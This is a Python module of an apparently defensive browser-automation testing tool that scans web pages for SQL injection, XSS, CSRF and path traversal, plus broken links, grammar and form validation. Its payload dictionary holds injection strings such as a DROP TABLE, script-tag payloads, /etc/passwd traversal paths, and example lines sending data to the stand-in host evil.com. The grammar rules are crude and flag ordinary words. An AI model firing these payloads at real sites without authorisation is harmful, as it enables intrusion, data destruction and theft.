"""
🤖 Fagun Browser Automation Testing Agent - Advanced Testing Module
=================================================================

Advanced testing capabilities including security testing, broken URL detection,
grammatical error checking, and intelligent form testing.

Author: Mejbaur Bahar Fagun
Role: Software Engineer in Test
LinkedIn: https://www.linkedin.com/in/mejbaur/
"""

import asyncio
import re
import random
import string
import requests
from typing import List, Dict, Any, Optional, Tuple
from playwright.async_api import Page, Locator
import logging
from dataclasses import dataclass
from enum import Enum

logger = logging.getLogger(__name__)


class TestType(Enum):
    """Types of tests that can be performed."""
    SECURITY = "security"
    FUNCTIONALITY = "functionality"
    BROKEN_URL = "broken_url"
    GRAMMAR = "grammar"
    FORM_TESTING = "form_testing"
    PERFORMANCE = "performance"


@dataclass
class TestResult:
    """Result of a test execution."""
    test_type: TestType
    test_name: str
    status: str  # "PASSED", "FAILED", "WARNING"
    description: str
    details: Dict[str, Any]
    recommendations: List[str]


class AdvancedTestingEngine:
    """Advanced testing engine with AI thinking capabilities."""
    
    def __init__(self):
        self.test_results: List[TestResult] = []
        self.security_payloads = self._load_security_payloads()
        self.form_test_data = self._load_form_test_data()
        self.grammar_rules = self._load_grammar_rules()
    
    def _load_security_payloads(self) -> Dict[str, List[str]]:
        """Load security testing payloads."""
        return {
            "sql_injection": [
                "' OR '1'='1",
                "'; DROP TABLE users; --",
                "' UNION SELECT * FROM users --",
                "admin'--",
                "admin'/*",
                "' OR 1=1#",
                "' OR 'x'='x",
                "') OR ('1'='1",
                "1' OR '1'='1' AND '1'='1",
                "1' OR '1'='1' LIMIT 1 --"
            ],
            "xss": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>",
                "<iframe src=javascript:alert('XSS')></iframe>",
                "<body onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<select onfocus=alert('XSS') autofocus>",
                "<textarea onfocus=alert('XSS') autofocus>",
                "<keygen onfocus=alert('XSS') autofocus>"
            ],
            "csrf": [
                "<form action='http://evil.com/steal' method='POST'>",
                "<img src='http://evil.com/steal?data=secret'>",
                "<script>fetch('http://evil.com/steal', {method: 'POST', body: 'data=secret'})</script>"
            ],
            "path_traversal": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "..%2F..%2F..%2Fetc%2Fpasswd",
                "..%252F..%252F..%252Fetc%252Fpasswd"
            ]
        }
    
    def _load_form_test_data(self) -> Dict[str, Dict[str, List[str]]]:
        """Load comprehensive form test data."""
        return {
            "email": {
                "valid": [
                    "test@example.com",
                    "user.name@domain.co.uk",
                    "admin+test@company.org",
                    "valid.email@subdomain.example.com"
                ],
                "invalid": [
                    "invalid-email",
                    "@domain.com",
                    "user@",
                    "user@domain",
                    "user..name@domain.com",
                    "user@.domain.com",
                    "user@domain..com"
                ],
                "edge_cases": [
                    "a@b.c",
                    "test+tag@example.com",
                    "user123@test-domain.com",
                    "very.long.email.address@very.long.domain.name.com"
                ]
            },
            "password": {
                "valid": [
                    "SecurePass123!",
                    "MyStr0ng#Password",
                    "ComplexP@ssw0rd",
                    "Safe123$Password"
                ],
                "invalid": [
                    "123",
                    "password",
                    "12345678",
                    "qwerty",
                    "abc123",
                    "Password",
                    "password123"
                ],
                "edge_cases": [
                    "a",
                    "a" * 100,
                    " ",
                    "password with spaces",
                    "password\twith\ttabs"
                ]
            },
            "phone": {
                "valid": [
                    "+1234567890",
                    "123-456-7890",
                    "(123) 456-7890",
                    "+1-234-567-8900",
                    "123.456.7890"
                ],
                "invalid": [
                    "123",
                    "abc-def-ghij",
                    "123-456-789",
                    "+12345678901234567890",
                    "123 456 789"
                ],
                "edge_cases": [
                    "+1-234-567-8900 ext 123",
                    "123-456-7890 x123",
                    "+1 (234) 567-8900"
                ]
            },
            "name": {
                "valid": [
                    "John Doe",
                    "Mary Jane Smith",
                    "José María",
                    "李小明",
                    "Jean-Pierre"
                ],
                "invalid": [
                    "123",
                    "John123",
                    "John@Doe",
                    "John<script>",
                    ""
                ],
                "edge_cases": [
                    "John O'Connor",
                    "Mary-Jane Smith",
                    "José María de la Cruz",
                    "X Æ A-12"
                ]
            },
            "url": {
                "valid": [
                    "https://example.com",
                    "http://test.org",
                    "https://subdomain.example.com/path",
                    "https://example.com:8080/path?query=value"
                ],
                "invalid": [
                    "not-a-url",
                    "ftp://example.com",
                    "javascript:alert('xss')",
                    "data:text/html,<script>alert('xss')</script>"
                ],
                "edge_cases": [
                    "https://example.com/",
                    "https://example.com/path/",
                    "https://example.com/path?query=&value=test"
                ]
            }
        }
    
    def _load_grammar_rules(self) -> Dict[str, List[str]]:
        """Load grammar checking rules."""
        return {
            "common_errors": [
                r"\b(its|it's)\b",  # its vs it's
                r"\b(there|their|they're)\b",  # there/their/they're
                r"\b(your|you're)\b",  # your vs you're
                r"\b(loose|lose)\b",  # loose vs lose
                r"\b(affect|effect)\b",  # affect vs effect
                r"\b(than|then)\b",  # than vs then
                r"\b(accept|except)\b",  # accept vs except
                r"\b(principal|principle)\b",  # principal vs principle
                r"\b(compliment|complement)\b",  # compliment vs complement
                r"\b(discreet|discrete)\b"  # discreet vs discrete
            ],
            "punctuation": [
                r"[.!?]\s*[a-z]",  # Missing capital after sentence
                r"[a-z][A-Z]",  # Missing space between words
                r"\s+",  # Multiple spaces
                r"[^\w\s.,!?;:()\"'-]",  # Invalid characters
            ],
            "spelling": [
                r"\b(recieve|recieved)\b",  # receive
                r"\b(seperate|seperated)\b",  # separate
                r"\b(definately|defiantly)\b",  # definitely
                r"\b(occured|occured)\b",  # occurred
                r"\b(neccessary|necesary)\b",  # necessary
                r"\b(accomodate|acommodate)\b",  # accommodate
                r"\b(embarass|embarras)\b",  # embarrass
                r"\b(maintainance|maintenence)\b",  # maintenance
                r"\b(priviledge|privilage)\b",  # privilege
                r"\b(occassion|ocasion)\b"  # occasion
            ]
        }
    
    async def perform_security_testing(self, page: Page) -> List[TestResult]:
        """Perform comprehensive security testing."""
        results = []
        
        # Test for SQL Injection vulnerabilities
        sql_results = await self._test_sql_injection(page)
        results.extend(sql_results)
        
        # Test for XSS vulnerabilities
        xss_results = await self._test_xss_vulnerabilities(page)
        results.extend(xss_results)
        
        # Test for CSRF vulnerabilities
        csrf_results = await self._test_csrf_vulnerabilities(page)
        results.extend(csrf_results)
        
        # Test for Path Traversal vulnerabilities
        path_traversal_results = await self._test_path_traversal(page)
        results.extend(path_traversal_results)
        
        return results
    
    async def _test_sql_injection(self, page: Page) -> List[TestResult]:
        """Test for SQL injection vulnerabilities."""
        results = []
        
        try:
            # Find all input fields
            inputs = await page.query_selector_all('input[type="text"], input[type="email"], input[type="password"], textarea')
            
            for input_field in inputs:
                for payload in self.security_payloads["sql_injection"]:
                    try:
                        await input_field.fill(payload)
                        await page.keyboard.press('Enter')
                        await page.wait_for_timeout(1000)
                        
                        # Check for SQL error messages
                        content = await page.content()
                        sql_errors = [
                            "mysql_fetch_array",
                            "ORA-01756",
                            "Microsoft OLE DB Provider",
                            "SQLServer JDBC Driver",
                            "PostgreSQL query failed",
                            "Warning: mysql_",
                            "valid MySQL result",
                            "MySqlClient.",
                            "SQL syntax",
                            "mysql_num_rows",
                            "mysql_query",
                            "mysql_fetch_assoc",
                            "mysql_fetch_row",
                            "mysql_numrows",
                            "mysql_close",
                            "mysql_connect",
                            "mysql_create_db",
                            "mysql_data_seek",
                            "mysql_db_name",
                            "mysql_db_query",
                            "mysql_drop_db",
                            "mysql_errno",
                            "mysql_error",
                            "mysql_fetch_array",
                            "mysql_fetch_field",
                            "mysql_fetch_lengths",
                            "mysql_fetch_object",
                            "mysql_fetch_result",
                            "mysql_field_flags",
                            "mysql_field_len",
                            "mysql_field_name",
                            "mysql_field_seek",
                            "mysql_field_table",
                            "mysql_field_type",
                            "mysql_free_result",
                            "mysql_get_client_info",
                            "mysql_get_host_info",
                            "mysql_get_proto_info",
                            "mysql_get_server_info",
                            "mysql_info",
                            "mysql_insert_id",
                            "mysql_list_dbs",
                            "mysql_list_fields",
                            "mysql_list_processes",
                            "mysql_list_tables",
                            "mysql_pconnect",
                            "mysql_ping",
                            "mysql_query",
                            "mysql_real_escape_string",
                            "mysql_result",
                            "mysql_select_db",
                            "mysql_stat",
                            "mysql_tablename",
                            "mysql_thread_id",
                            "mysql_unbuffered_query"
                        ]
                        
                        for error in sql_errors:
                            if error.lower() in content.lower():
                                results.append(TestResult(
                                    test_type=TestType.SECURITY,
                                    test_name="SQL Injection Vulnerability",
                                    status="FAILED",
                                    description=f"SQL injection vulnerability detected with payload: {payload}",
                                    details={
                                        "payload": payload,
                                        "error_message": error,
                                        "input_field": await input_field.get_attribute("name") or "unknown"
                                    },
                                    recommendations=[
                                        "Implement parameterized queries",
                                        "Use prepared statements",
                                        "Validate and sanitize all input",
                                        "Implement proper error handling"
                                    ]
                                ))
                                break
                        
                        # Clear the input for next test
                        await input_field.fill("")
                        
                    except Exception as e:
                        logger.warning(f"Error testing SQL injection: {e}")
                        continue
        
        except Exception as e:
            logger.error(f"Error in SQL injection testing: {e}")
        
        return results
    
    async def _test_xss_vulnerabilities(self, page: Page) -> List[TestResult]:
        """Test for XSS vulnerabilities."""
        results = []
        
        try:
            # Find all input fields
            inputs = await page.query_selector_all('input[type="text"], input[type="email"], input[type="password"], textarea')
            
            for input_field in inputs:
                for payload in self.security_payloads["xss"]:
                    try:
                        await input_field.fill(payload)
                        await page.keyboard.press('Enter')
                        await page.wait_for_timeout(1000)
                        
                        # Check if the payload is reflected in the page
                        content = await page.content()
                        if payload in content:
                            results.append(TestResult(
                                test_type=TestType.SECURITY,
                                test_name="XSS Vulnerability",
                                status="FAILED",
                                description=f"XSS vulnerability detected with payload: {payload}",
                                details={
                                    "payload": payload,
                                    "input_field": await input_field.get_attribute("name") or "unknown",
                                    "reflected": True
                                },
                                recommendations=[
                                    "Implement proper input validation",
                                    "Use output encoding",
                                    "Implement Content Security Policy (CSP)",
                                    "Sanitize user input before display"
                                ]
                            ))
                        
                        # Clear the input for next test
                        await input_field.fill("")
                        
                    except Exception as e:
                        logger.warning(f"Error testing XSS: {e}")
                        continue
        
        except Exception as e:
            logger.error(f"Error in XSS testing: {e}")
        
        return results
    
    async def _test_csrf_vulnerabilities(self, page: Page) -> List[TestResult]:
        """Test for CSRF vulnerabilities."""
        results = []
        
        try:
            # Check for CSRF tokens in forms
            forms = await page.query_selector_all('form')
            
            for form in forms:
                csrf_token = await form.query_selector('input[name*="csrf"], input[name*="token"], input[name*="_token"]')
                
                if not csrf_token:
                    results.append(TestResult(
                        test_type=TestType.SECURITY,
                        test_name="CSRF Vulnerability",
                        status="WARNING",
                        description="Form lacks CSRF protection token",
                        details={
                            "form_action": await form.get_attribute("action") or "unknown",
                            "csrf_token_present": False
                        },
                        recommendations=[
                            "Implement CSRF tokens",
                            "Use SameSite cookie attribute",
                            "Implement proper CSRF protection",
                            "Validate origin and referer headers"
                        ]
                    ))
        
        except Exception as e:
            logger.error(f"Error in CSRF testing: {e}")
        
        return results
    
    async def _test_path_traversal(self, page: Page) -> List[TestResult]:
        """Test for path traversal vulnerabilities."""
        results = []
        
        try:
            # Test URL parameters for path traversal
            current_url = page.url
            base_url = current_url.split('?')[0]
            
            for payload in self.security_payloads["path_traversal"]:
                try:
                    test_url = f"{base_url}?file={payload}"
                    response = await page.goto(test_url)
                    
                    if response and response.status == 200:
                        content = await page.content()
                        
                        # Check for sensitive file content
                        sensitive_patterns = [
                            "root:",
                            "daemon:",
                            "bin:",
                            "sys:",
                            "adm:",
                            "tty:",
                            "disk:",
                            "lp:",
                            "mail:",
                            "news:",
                            "uucp:",
                            "man:",
                            "proxy:",
                            "kmem:",
                            "dialout:",
                            "fax:",
                            "voice:",
                            "cdrom:",
                            "floppy:",
                            "tape:",
                            "sudo:",
                            "audio:",
                            "dip:",
                            "www-data:",
                            "backup:",
                            "operator:",
                            "list:",
                            "irc:",
                            "src:",
                            "gnats:",
                            "shadow:",
                            "utmp:",
                            "video:",
                            "sasl:",
                            "plugdev:",
                            "staff:",
                            "games:",
                            "users:",
                            "nogroup:",
                            "systemd-journal:",
                            "systemd-network:",
                            "systemd-resolve:",
                            "systemd-timesync:",
                            "messagebus:",
                            "syslog:",
                            "_apt:",
                            "tss:",
                            "uuidd:",
                            "tcpdump:",
                            "tty:",
                            "landscape:",
                            "pollinate:",
                            "sshd:",
                            "systemd-coredump:",
                            "ubuntu:",
                            "lxd:",
                            "dnsmasq:",
                            "libvirt-qemu:",
                            "libvirt-dnsmasq:",
                            "Debian-exim:",
                            "statd:",
                            "nobody:",
                            "_rpc:",
                            "colord:",
                            "geoclue:",
                            "pulse:",
                            "rtkit:",
                            "saned:",
                            "usbmux:",
                            "whoopsie:",
                            "kernoops:",
                            "speech-dispatcher:",
                            "avahi:",
                            "samba:",
                            "lightdm:",
                            "nvidia-persistenced:",
                            "cups-pk-helper:",
                            "hplip:",
                            "gdm:",
                            "gnome-initial-setup:",
                            "geoclue:",
                            "pulse:",
                            "rtkit:",
                            "saned:",
                            "usbmux:",
                            "whoopsie:",
                            "kernoops:",
                            "speech-dispatcher:",
                            "avahi:",
                            "samba:",
                            "lightdm:",
                            "nvidia-persistenced:",
                            "cups-pk-helper:",
                            "hplip:",
                            "gdm:",
                            "gnome-initial-setup:"
                        ]
                        
                        for pattern in sensitive_patterns:
                            if pattern in content:
                                results.append(TestResult(
                                    test_type=TestType.SECURITY,
                                    test_name="Path Traversal Vulnerability",
                                    status="FAILED",
                                    description=f"Path traversal vulnerability detected with payload: {payload}",
                                    details={
                                        "payload": payload,
                                        "test_url": test_url,
                                        "sensitive_content": pattern
                                    },
                                    recommendations=[
                                        "Implement proper input validation",
                                        "Use whitelist approach for file access",
                                        "Implement proper file path sanitization",
                                        "Use chroot or similar isolation techniques"
                                    ]
                                ))
                                break
                    
                    await page.goto(current_url)  # Return to original page
                    
                except Exception as e:
                    logger.warning(f"Error testing path traversal: {e}")
                    continue
        
        except Exception as e:
            logger.error(f"Error in path traversal testing: {e}")
        
        return results
    
    async def check_broken_urls(self, page: Page) -> List[TestResult]:
        """Check for broken URLs and links."""
        results = []
        
        try:
            # Find all links on the page
            links = await page.query_selector_all('a[href]')
            
            for link in links:
                href = await link.get_attribute('href')
                if href:
                    # Convert relative URLs to absolute
                    if href.startswith('/'):
                        base_url = f"{page.url.split('/')[0]}//{page.url.split('/')[2]}"
                        href = f"{base_url}{href}"
                    elif href.startswith('#'):
                        continue  # Skip anchor links
                    elif not href.startswith('http'):
                        continue  # Skip non-HTTP links
                    
                    try:
                        response = requests.get(href, timeout=10, allow_redirects=True)
                        
                        if response.status_code >= 400:
                            results.append(TestResult(
                                test_type=TestType.BROKEN_URL,
                                test_name="Broken URL",
                                status="FAILED",
                                description=f"Broken URL found: {href}",
                                details={
                                    "url": href,
                                    "status_code": response.status_code,
                                    "link_text": await link.inner_text() or "No text"
                                },
                                recommendations=[
                                    "Fix the broken URL",
                                    "Update the link to point to correct page",
                                    "Implement proper error handling for broken links"
                                ]
                            ))
                        elif response.status_code >= 300:
                            results.append(TestResult(
                                test_type=TestType.BROKEN_URL,
                                test_name="Redirect URL",
                                status="WARNING",
                                description=f"URL redirects: {href}",
                                details={
                                    "url": href,
                                    "status_code": response.status_code,
                                    "redirect_url": response.url,
                                    "link_text": await link.inner_text() or "No text"
                                },
                                recommendations=[
                                    "Consider updating the link to point directly to final destination",
                                    "Ensure redirects are working correctly"
                                ]
                            ))
                    
                    except requests.exceptions.RequestException as e:
                        results.append(TestResult(
                            test_type=TestType.BROKEN_URL,
                            test_name="Unreachable URL",
                            status="FAILED",
                            description=f"Unreachable URL: {href}",
                            details={
                                "url": href,
                                "error": str(e),
                                "link_text": await link.inner_text() or "No text"
                            },
                            recommendations=[
                                "Check if the URL is correct",
                                "Verify the server is accessible",
                                "Implement proper error handling"
                            ]
                        ))
        
        except Exception as e:
            logger.error(f"Error checking broken URLs: {e}")
        
        return results
    
    async def check_grammatical_errors(self, page: Page) -> List[TestResult]:
        """Check for grammatical errors in text content."""
        results = []
        
        try:
            # Get all text content from the page
            text_elements = await page.query_selector_all('p, h1, h2, h3, h4, h5, h6, span, div, li, td, th')
            
            for element in text_elements:
                text = await element.inner_text()
                if text and len(text.strip()) > 10:  # Only check meaningful text
                    
                    # Check for common grammar errors
                    for rule_name, patterns in self.grammar_rules.items():
                        for pattern in patterns:
                            matches = re.findall(pattern, text, re.IGNORECASE)
                            if matches:
                                results.append(TestResult(
                                    test_type=TestType.GRAMMAR,
                                    test_name=f"Grammar Issue - {rule_name}",
                                    status="WARNING",
                                    description=f"Potential grammar issue found: {matches[0]}",
                                    details={
                                        "text": text[:100] + "..." if len(text) > 100 else text,
                                        "rule_type": rule_name,
                                        "pattern": pattern,
                                        "matches": matches,
                                        "element_tag": await element.evaluate("el => el.tagName")
                                    },
                                    recommendations=[
                                        "Review the text for grammar errors",
                                        "Use a grammar checking tool",
                                        "Have content reviewed by a native speaker"
                                    ]
                                ))
        
        except Exception as e:
            logger.error(f"Error checking grammatical errors: {e}")
        
        return results
    
    async def intelligent_form_testing(self, page: Page) -> List[TestResult]:
        """Perform intelligent form testing with various data types."""
        results = []
        
        try:
            # Find all forms on the page
            forms = await page.query_selector_all('form')
            
            for form in forms:
                form_results = await self._test_form_intelligently(form, page)
                results.extend(form_results)
        
        except Exception as e:
            logger.error(f"Error in intelligent form testing: {e}")
        
        return results
    
    async def _test_form_intelligently(self, form: Locator, page: Page) -> List[TestResult]:
        """Test a form intelligently with various data types."""
        results = []
        
        try:
            # Get all input fields in the form
            inputs = await form.query_selector_all('input, textarea, select')
            
            # Analyze each input field
            for input_field in inputs:
                input_type = await input_field.get_attribute('type') or 'text'
                input_name = await input_field.get_attribute('name') or 'unknown'
                input_id = await input_field.get_attribute('id') or 'unknown'
                
                # Determine the field type based on attributes and context
                field_type = self._determine_field_type(input_type, input_name, input_id)
                
                # Test with appropriate data
                test_results = await self._test_field_with_data(input_field, field_type, page)
                results.extend(test_results)
        
        except Exception as e:
            logger.error(f"Error testing form intelligently: {e}")
        
        return results
    
    def _determine_field_type(self, input_type: str, input_name: str, input_id: str) -> str:
        """Determine the field type based on attributes."""
        field_identifier = f"{input_type} {input_name} {input_id}".lower()
        
        if 'email' in field_identifier:
            return 'email'
        elif 'password' in field_identifier:
            return 'password'
        elif 'phone' in field_identifier or 'tel' in field_identifier:
            return 'phone'
        elif 'name' in field_identifier and 'first' in field_identifier:
            return 'first_name'
        elif 'name' in field_identifier and 'last' in field_identifier:
            return 'last_name'
        elif 'name' in field_identifier:
            return 'name'
        elif 'url' in field_identifier or 'website' in field_identifier:
            return 'url'
        elif 'date' in field_identifier:
            return 'date'
        elif 'number' in field_identifier or 'age' in field_identifier:
            return 'number'
        elif 'message' in field_identifier or 'comment' in field_identifier:
            return 'message'
        else:
            return 'text'
    
    async def _test_field_with_data(self, input_field: Locator, field_type: str, page: Page) -> List[TestResult]:
        """Test a field with appropriate test data."""
        results = []
        
        if field_type in self.form_test_data:
            test_data = self.form_test_data[field_type]
            
            # Test with valid data
            for valid_data in test_data['valid']:
                try:
                    await input_field.fill(valid_data)
                    await page.keyboard.press('Tab')  # Trigger validation
                    await page.wait_for_timeout(500)
                    
                    # Check for validation errors
                    error_element = await page.query_selector('.error, .invalid, [class*="error"], [class*="invalid"]')
                    if error_element:
                        results.append(TestResult(
                            test_type=TestType.FORM_TESTING,
                            test_name=f"Form Validation - Valid Data Rejected",
                            status="FAILED",
                            description=f"Valid {field_type} data rejected: {valid_data}",
                            details={
                                "field_type": field_type,
                                "test_data": valid_data,
                                "error_message": await error_element.inner_text()
                            },
                            recommendations=[
                                "Review form validation logic",
                                "Ensure valid data is accepted",
                                "Test with various valid formats"
                            ]
                        ))
                
                except Exception as e:
                    logger.warning(f"Error testing valid data: {e}")
            
            # Test with invalid data
            for invalid_data in test_data['invalid']:
                try:
                    await input_field.fill(invalid_data)
                    await page.keyboard.press('Tab')  # Trigger validation
                    await page.wait_for_timeout(500)
                    
                    # Check for validation errors
                    error_element = await page.query_selector('.error, .invalid, [class*="error"], [class*="invalid"]')
                    if not error_element:
                        results.append(TestResult(
                            test_type=TestType.FORM_TESTING,
                            test_name=f"Form Validation - Invalid Data Accepted",
                            status="FAILED",
                            description=f"Invalid {field_type} data accepted: {invalid_data}",
                            details={
                                "field_type": field_type,
                                "test_data": invalid_data
                            },
                            recommendations=[
                                "Implement proper input validation",
                                "Reject invalid data formats",
                                "Show appropriate error messages"
                            ]
                        ))
                
                except Exception as e:
                    logger.warning(f"Error testing invalid data: {e}")
            
            # Test with edge cases
            for edge_data in test_data['edge_cases']:
                try:
                    await input_field.fill(edge_data)
                    await page.keyboard.press('Tab')  # Trigger validation
                    await page.wait_for_timeout(500)
                    
                    # Check for validation errors
                    error_element = await page.query_selector('.error, .invalid, [class*="error"], [class*="invalid"]')
                    if error_element:
                        results.append(TestResult(
                            test_type=TestType.FORM_TESTING,
                            test_name=f"Form Validation - Edge Case Rejected",
                            status="WARNING",
                            description=f"Edge case {field_type} data rejected: {edge_data}",
                            details={
                                "field_type": field_type,
                                "test_data": edge_data,
                                "error_message": await error_element.inner_text()
                            },
                            recommendations=[
                                "Consider accepting edge case data",
                                "Review validation rules for edge cases",
                                "Document expected behavior for edge cases"
                            ]
                        ))
                
                except Exception as e:
                    logger.warning(f"Error testing edge case data: {e}")
        
        return results
    
    async def ai_thinking_analysis(self, page: Page) -> List[TestResult]:
        """AI thinking analysis to determine what to test next."""
        results = []
        
        try:
            # Analyze page content to determine testing strategy
            page_content = await page.content()
            
            # Check for forms
            forms = await page.query_selector_all('form')
            if forms:
                results.append(TestResult(
                    test_type=TestType.FUNCTIONALITY,
                    test_name="AI Analysis - Forms Detected",
                    status="INFO",
                    description=f"Found {len(forms)} form(s) on the page",
                    details={
                        "forms_count": len(forms),
                        "recommendation": "Perform comprehensive form testing"
                    },
                    recommendations=[
                        "Test all form fields with valid and invalid data",
                        "Check form validation and error handling",
                        "Test form submission and success scenarios"
                    ]
                ))
            
            # Check for links
            links = await page.query_selector_all('a[href]')
            if links:
                results.append(TestResult(
                    test_type=TestType.FUNCTIONALITY,
                    test_name="AI Analysis - Links Detected",
                    status="INFO",
                    description=f"Found {len(links)} link(s) on the page",
                    details={
                        "links_count": len(links),
                        "recommendation": "Perform link testing"
                    },
                    recommendations=[
                        "Check for broken links",
                        "Test external link security",
                        "Verify link destinations"
                    ]
                ))
            
            # Check for input fields
            inputs = await page.query_selector_all('input, textarea, select')
            if inputs:
                results.append(TestResult(
                    test_type=TestType.SECURITY,
                    test_name="AI Analysis - Input Fields Detected",
                    status="INFO",
                    description=f"Found {len(inputs)} input field(s) on the page",
                    details={
                        "inputs_count": len(inputs),
                        "recommendation": "Perform security testing"
                    },
                    recommendations=[
                        "Test for SQL injection vulnerabilities",
                        "Test for XSS vulnerabilities",
                        "Test input validation and sanitization"
                    ]
                ))
            
            # Check for JavaScript
            scripts = await page.query_selector_all('script')
            if scripts:
                results.append(TestResult(
                    test_type=TestType.SECURITY,
                    test_name="AI Analysis - JavaScript Detected",
                    status="INFO",
                    description=f"Found {len(scripts)} script(s) on the page",
                    details={
                        "scripts_count": len(scripts),
                        "recommendation": "Perform JavaScript security testing"
                    },
                    recommendations=[
                        "Check for client-side vulnerabilities",
                        "Test for DOM-based XSS",
                        "Verify JavaScript security practices"
                    ]
                ))
        
        except Exception as e:
            logger.error(f"Error in AI thinking analysis: {e}")
        
        return results
    
    async def run_comprehensive_testing(self, page: Page) -> List[TestResult]:
        """Run comprehensive testing with AI thinking."""
        all_results = []
        
        # AI thinking analysis
        ai_results = await self.ai_thinking_analysis(page)
        all_results.extend(ai_results)
        
        # Security testing
        security_results = await self.perform_security_testing(page)
        all_results.extend(security_results)
        
        # Broken URL checking
        url_results = await self.check_broken_urls(page)
        all_results.extend(url_results)
        
        # Grammar checking
        grammar_results = await self.check_grammatical_errors(page)
        all_results.extend(grammar_results)
        
        # Intelligent form testing
        form_results = await self.intelligent_form_testing(page)
        all_results.extend(form_results)
        
        return all_results


# Global instance
advanced_testing_engine = AdvancedTestingEngine()
